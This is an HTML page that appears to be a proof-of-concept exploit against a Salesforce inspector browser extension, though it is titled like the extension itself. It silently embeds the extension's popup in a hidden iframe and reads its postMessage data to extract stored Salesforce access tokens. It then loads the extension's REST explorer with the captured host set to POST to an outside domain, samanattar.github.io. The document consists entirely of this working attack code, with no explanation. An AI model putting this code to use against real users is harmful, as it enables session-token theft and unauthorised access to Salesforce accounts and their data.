<!DOCTYPE html>
<html>
<head>
    <title>SFDC Inspector Reloaded</title>
    <style>
        body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
        #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
        #restExplorer { margin-top: 20px; }
        #restExplorer iframe { width: 100%; height: 800px; border: 1px solid #ccc; }
        pre { margin: 10px 0; white-space: pre-wrap; }
        .token { color: #2e7d32; }
        .message { color: #1976d2; }
    </style>
</head>
<body>
    <div id="messages"></div>
    <div id="restExplorer"></div>
    <script>
        function displayMessage(label, msg) {
            const pre = document.createElement('pre');
            pre.textContent = `${label}:\n${typeof msg === 'object' ? JSON.stringify(msg, null, 2) : msg}`;
            pre.className = label.includes('Token') ? 'token' : 'message';
            document.getElementById('messages').appendChild(pre);
        }

        window.addEventListener('message', function(event) {
            if (event.data.insextInitRequest) {
                displayMessage('Init Request', event.data);
                
                const storage = event.data.iFrameLocalStorage;
                // Display access tokens
                for (let host in storage) {
                    if (storage[host].includes('access_token')) {
                        displayMessage('Access Token Found', `Host: ${host}\nStorage: ${storage[host]}`);
                    }
                }
                
                // Create REST explorer iframe using first host
                const firstHost = Object.keys(storage)[0];
                if (firstHost) {
                    const explorerFrame = document.createElement('iframe');
                    explorerFrame.src = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/rest-explore.html?host=${firstHost}&method=POST&endpoint=samanattar.github.io`;
                    document.getElementById('restExplorer').appendChild(explorerFrame);
                }
            } else if (event.data.insextInitResponse) {
                displayMessage('Init Response', event.data);
            } else if (event.data.insextLoaded) {
                displayMessage('Extension Status', 'Extension Loaded');
            } else if (event.data.insextShowStdPageDetails) {
                displayMessage('Show Page Details', event.data);
            } else if (event.data.insextUpdateRecordId) {
                displayMessage('Record ID Update', event.data);
            }
        });

        // Initial iframe for getting localStorage data
        const initFrame = document.createElement('iframe');
        initFrame.src = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html`;
        initFrame.style.display = 'none';
        document.body.appendChild(initFrame);
    </script>
</body>
</html>
